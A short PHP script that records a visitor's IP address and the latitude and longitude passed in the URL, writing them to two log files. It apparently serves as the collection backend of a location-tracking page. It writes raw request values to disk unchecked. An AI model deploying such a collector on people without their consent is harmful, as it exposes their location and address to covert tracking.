<?php
$lat = $_GET['lat'];
$lon = $_GET['lon'];
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$f = fopen("./../../logs/result.txt", "w+");
fwrite($f, " IP: $ip lat: $lat long: $lon\n");
fclose($f);
$f = fopen("./../../logs/logger.log", "a+");
fwrite($f, " IP: $ip lat: $lat long: $lon\n");
fclose($f);
?>

